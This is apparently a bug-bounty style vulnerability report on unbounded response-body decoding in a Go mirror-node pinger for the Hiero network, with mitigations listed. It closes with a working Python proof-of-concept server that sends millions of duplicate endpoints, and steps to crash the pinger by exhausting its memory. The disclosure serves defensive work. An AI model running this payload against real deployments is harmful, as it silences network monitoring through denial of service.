### Title
Unbounded Response Body in `fetchMirrorNodeNetwork()` Enables Memory/CPU Exhaustion via Malicious Mirror Node

### Summary
`fetchMirrorNodeNetwork()` in `pinger/mirror_node_client.go` reads the HTTP response body from the configured mirror node using `json.NewDecoder(resp.Body).Decode(&payload)` with no body-size limit. An attacker who controls the mirror node response (via MITM on a plain-HTTP connection, DNS poisoning, or operating a malicious mirror node) can return a single valid node entry with millions of duplicate `service_endpoints`, causing the Go JSON decoder to allocate a `[]serviceEndpoint` slice of unbounded size in memory, and then force the pinger process to iterate over every entry in O(N) CPU work, crashing or hanging the pinger via OOM or CPU exhaustion.

### Finding Description

**Exact code path:**

`pinger/mirror_node_client.go`, `fetchMirrorNodeNetwork()`, lines 95–124:

```go
// Line 96 — no http.MaxBytesReader, no size cap, reads entire body
var payload nodesEnvelope
if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil {
    return nil, false, fmt.Errorf("decode mirror nodes: %w", err)
}

// Lines 100–124 — iterates ALL service_endpoints with no count limit
network := make(map[string]hiero.AccountID)
for _, n := range payload.Nodes {
    ...
    for _, ep := range n.ServiceEndpoints {   // N = attacker-controlled
        ...
        addr := net.JoinHostPort(host, fmt.Sprintf("%d", ep.Port))
        network[addr] = nodeAccountId         // deduplicates, but loop still runs N times
    }
}
```

**Root cause:** `resp.Body` is passed directly to `json.NewDecoder` without wrapping in `http.MaxBytesReader`. The JSON decoder materialises the entire `nodes[0].service_endpoints` array as a Go `[]serviceEndpoint` slice in heap memory. Each `serviceEndpoint` struct occupies ~40 bytes (two 16-byte string headers + 8-byte int); 10 million entries = ~400 MB of slice memory alone, plus the raw string data for each `ip_address_v4`/`domain_name` field. After decoding, the inner loop at line 113 iterates every entry unconditionally, performing `strings.TrimSpace`, `net.JoinHostPort`, `fmt.Sprintf`, and a map write per iteration — all O(N) CPU work — even though the map itself deduplicates to a single key.

**Why the HTTP timeout does not save the process:** `config.go` line 46 sets only a time-based `http.Client{Timeout: cfg.mirrorNodeClientTimeout}` (default 10 s). A co-located or fast-network attacker can stream hundreds of MB/s; a 200 MB/s link delivers 2 GB within the default window. The timeout fires only after the full round-trip, not after a size threshold.

**No per-endpoint count guard exists.** The only filtering is `host == "" || ep.Port == 0` (line 118), which the attacker trivially satisfies by supplying a valid host and port in every duplicate entry.

### Impact Explanation

The pinger process is killed by the Go runtime OOM killer or becomes unresponsive due to GC pressure before `fetchMirrorNodeNetwork` returns. Because `buildNetworkFromMirrorNodes` is called at startup to populate the Hiero SDK client network map, a successful attack prevents the pinger from ever initialising, causing a complete denial-of-service of the monitoring component. In a production deployment this silences all liveness/latency alerting for the Hiero network, which is the exact function the pinger exists to provide. The scope label ("Non-network-based DoS affecting projects with ≥ 25% market cap") reflects that the Hiero/Hedera mainnet pinger is the affected component.

### Likelihood Explanation

**Preconditions:**
1. The attacker must be able to influence what the mirror node returns. Realistic vectors:
   - The `mirrorRest` URL uses plain HTTP (the documented example in `config.go` line 37 is `http://mirror-rest:5551`); any on-path attacker (ARP spoof, BGP hijack, cloud VPC misconfiguration) can MITM the connection.
   - DNS poisoning of the mirror node hostname redirects the pinger to an attacker-controlled server.
   - In a multi-tenant or CI/CD environment where `HIERO_MIRROR_PINGER_REST` is user-supplied, the attacker simply points it at their own server.
2. No authentication of the mirror node response is performed (no TLS certificate pinning, no HMAC, no schema validation).

The attack is repeatable: the pinger retries up to `mirrorNodeClientMaxRetries` (default 10) times with exponential backoff, each retry re-issuing the same unbounded read, multiplying the resource consumption.

### Recommendation

1. **Wrap `resp.Body` with `http.MaxBytesReader` before decoding**, e.g.:
   ```go
   const maxBodyBytes = 10 * 1024 * 1024 // 10 MB
   resp.Body = http.MaxBytesReader(nil, resp.Body, maxBodyBytes)
   ```
2. **Cap the number of service endpoints processed per node**, e.g. skip or warn after the first 100 endpoints per node entry.
3. **Enforce HTTPS** for the mirror node URL and validate the TLS certificate to eliminate MITM as an attack vector.
4. **Add a `Content-Length` pre-check**: reject responses whose declared `Content-Length` exceeds the threshold before reading the body.

### Proof of Concept

```python
# Malicious mirror node server (Python)
from http.server import BaseHTTPRequestHandler, HTTPServer
import json

DUPE_COUNT = 5_000_000  # 5 million duplicate endpoints

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        endpoints = [{"ip_address_v4": "1.2.3.4", "port": 50211}] * DUPE_COUNT
        body = json.dumps({
            "nodes": [{"node_account_id": "0.0.3", "service_endpoints": endpoints}],
            "links": {"next": None}
        }).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

HTTPServer(("0.0.0.0", 5551), Handler).serve_forever()
```

**Steps:**
1. Run the server above on a host reachable from the pinger.
2. Start the pinger with `HIERO_MIRROR_PINGER_NETWORK=other HIERO_MIRROR_PINGER_REST=http://<attacker-host>:5551`.
3. Observe the pinger process RSS grow to several GB and either be OOM-killed or become unresponsive within the 10-second HTTP timeout window.
4. The pinger never completes initialisation; all monitoring is silenced.
